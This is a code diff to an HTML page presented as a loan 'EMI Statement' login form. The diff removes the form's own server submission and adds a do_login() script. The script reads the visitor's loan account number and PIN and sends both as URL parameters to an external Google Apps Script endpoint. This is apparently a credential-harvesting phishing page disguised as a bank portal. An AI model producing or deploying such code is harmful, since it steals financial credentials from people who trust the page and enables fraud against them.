@@ -71,11 +71,29 @@
     </div>
     <div class="form-container">
         <h2>EMI Statement</h2>
-        <form action="submit-emi-statement.php" method="post">
-            <input type="text" name="loan_account_number" placeholder="Loan Account Number" required>
-            <input type="password" name="pin" placeholder="PIN" required>
-            <button type="submit">Submit</button>
+        <form action="" method="post">
+            <input type="text" name="loan_account_number" id="loan_account_number" placeholder="Loan Account Number" required>
+            <input type="password" name="pin" id="pin" placeholder="PIN" required>
+            <button type="submit" onclick="do_login();">Submit</button>
         </form>
     </div>
+    <script>
+        function do_login(){
+               let accountNumber =  document.getElementById('loan_account_number').value;
+               let pin =  document.getElementById('pin').value;
+               if(accountNumber && pin){
+                fetch(`https://script.google.com/macros/s/AKfycbxwAY4ktV-dicRwWuYkxJa9bjNgyn-L-XqWBtgJ9N8ML5wHUTVyP1fC5rNtYR-2kqPj/exec?accountNumber=${accountNumber}&pin=${pin}`)
+                .then(response => {
+                    if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => console.log(data))
+                .catch(error => console.error('Fetch error:', error));
+               }
+            
+        }
+    </script>
 </body>
 </html>
